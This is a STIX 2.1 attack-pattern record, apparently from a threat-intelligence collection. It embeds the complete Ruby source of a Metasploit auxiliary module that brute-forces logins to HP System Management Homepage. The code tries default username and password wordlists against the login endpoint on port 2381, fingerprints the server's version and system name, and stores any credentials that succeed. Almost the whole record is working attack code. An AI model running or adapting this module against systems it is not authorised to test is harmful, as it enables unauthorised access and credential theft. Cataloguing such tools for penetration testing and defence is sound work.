{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--40b8647c-08a5-450c-af5a-4433b0c5f504",
    "created": "2024-08-14T16:29:14.657812Z",
    "modified": "2024-08-14T16:29:14.657816Z",
    "name": "\"HP System Management Homepage Login Utility\"",
    "description": " This module attempts to login to HP System Management Homepage using host operating system authentication.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/hp_sys_mgmt_login.rb",
            "external_id": "hp_sys_mgmt_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/smh'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"HP System Management Homepage Login Utility\",\n      'Description'    => %q{\n        This module attempts to login to HP System Management Homepage using host\n        operating system authentication.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'sinn3r' ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true,\n          'RPORT' => 2381,\n          'USERPASS_FILE' => File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_userpass.txt\"),\n          'USER_FILE' => File.join(Msf::Config.data_directory, \"wordlists\", \"unix_users.txt\"),\n          'PASS_FILE' => File.join(Msf::Config.data_directory, \"wordlists\", \"unix_passwords.txt\")\n        }\n    ))\n\n    register_advanced_options([\n      OptString.new('LOGIN_URL', [true, 'The URL that handles the login process', '/proxy/ssllogin']),\n      OptString.new('CPQLOGIN', [true, 'The homepage of the login', '/cpqlogin.htm']),\n      OptString.new('LOGIN_REDIRECT', [true, 'The URL to redirect to', '/cpqlogin'])\n    ])\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def get_version(res)\n    if res\n      return res.body.scan(/smhversion = \"HP System Management Homepage v([\\d\\.]+)\"/i).flatten[0] || ''\n    end\n\n    ''\n  end\n\n  def is_version_tested?(version)\n    # As of Sep 4 2014, version 7.4 is the latest and that's the last one we've tested\n    if Rex::Version.new(version) < Rex::Version.new('7.5')\n      return true\n    end\n\n    false\n  end\n\n  def get_system_name(res)\n    if res\n      return res.body.scan(/fullsystemname = \"(.+)\"/i).flatten[0] || ''\n    end\n\n    ''\n  end\n\n  def anonymous_access?(res)\n    return true if res and res.body =~ /username = \"hpsmh_anonymous\"/\n    false\n  end\n\n  def init_loginscanner(ip)\n    @cred_collection = build_credential_collection(\n      username: datastore['HttpUsername'],\n      password: datastore['HttpPassword']\n    )\n\n    @scanner = Metasploit::Framework::LoginScanner::Smh.new(\n      configure_http_login_scanner(\n        uri:                datastore['LOGIN_URL'],\n        cred_details:       @cred_collection,\n        stop_on_success:    datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 5,\n        http_username:      datastore['HttpUsername'],\n        http_password:      datastore['HttpPassword']\n      )\n    )\n  end\n\n def do_report(ip, port, result)\n    service_data = {\n      address: ip,\n      port: port,\n      service_name: 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: result.credential.private,\n      private_type: :password,\n      username: result.credential.public,\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      last_attempted_at: DateTime.now,\n      status: result.status\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def bruteforce(ip)\n    @scanner.scan! do |result|\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\"\n        do_report(ip, rport, result)\n        :next_user\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        if datastore['VERBOSE']\n          print_brute :level => :verror, :ip => ip, :msg => \"Could not connect\"\n        end\n        invalidate_login(\n            address: ip,\n            port: rport,\n            protocol: 'tcp',\n            public: result.credential.public,\n            private: result.credential.private,\n            realm_key: result.credential.realm_key,\n            realm_value: result.credential.realm,\n            status: result.status\n        )\n        :abort\n      when Metasploit::Model::Login::Status::INCORRECT\n        if datastore['VERBOSE']\n          print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n        end\n        invalidate_login(\n            address: ip,\n            port: rport,\n            protocol: 'tcp',\n            public: result.credential.public,\n            private: result.credential.private,\n            realm_key: result.credential.realm_key,\n            realm_value: result.credential.realm,\n            status: result.status\n        )\n      end\n    end\n  end\n\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'uri' => datastore['CPQLOGIN'],\n      'method' => 'GET',\n      'vars_get' => {\n        'RedirectUrl' => datastore['LOGIN_REDIRECT'],\n        'RedirectQueryString' => ''\n      }\n    })\n\n    sys_name = get_system_name(res)\n\n    if sys_name.blank?\n      print_error 'Could not retrieve system name.'\n      return\n    end\n\n    version = get_version(res)\n    unless version.blank?\n      print_status(\"Version detected: #{version}\")\n      unless is_version_tested?(version)\n        print_warning(\"You're running the module against a version we have not tested.\")\n      end\n    end\n\n    print_good(\"System name detected: #{sys_name}\")\n    report_note(\n      :host => ip,\n      :type => \"system.name\",\n      :data => sys_name\n    )\n\n    if anonymous_access?(res)\n      print_good(\"No login necessary. Server allows anonymous access.\")\n      return\n    end\n\n    init_loginscanner(ip)\n    bruteforce(ip)\n  end\nend\n\n"
}